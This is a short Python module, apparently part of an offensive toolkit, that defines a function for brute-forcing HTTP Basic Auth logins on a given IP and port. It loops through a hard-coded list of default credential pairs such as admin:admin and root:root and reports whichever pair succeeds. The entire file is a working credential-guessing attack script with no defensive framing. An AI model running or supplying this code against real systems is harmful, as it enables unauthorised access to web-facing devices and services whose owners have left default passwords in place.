# bruteforce/http_bruteforce.py
import requests
from requests.auth import HTTPBasicAuth

def http_bruteforce(ip, port=80, creds=[('admin', 'admin'), ('admin', 'password'), ('root', 'root')]):
    url = f"http://{ip}:{port}"
    print(f"[*] Trying HTTP brute-force on {url}")
    for username, password in creds:
        try:
            response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=2)
            if response.status_code == 200:
                print(f"[+] HTTP login success: {username}:{password}")
                return (username, password)
        except requests.RequestException:
            continue
    print("[-] No valid HTTP credentials found.")
    return None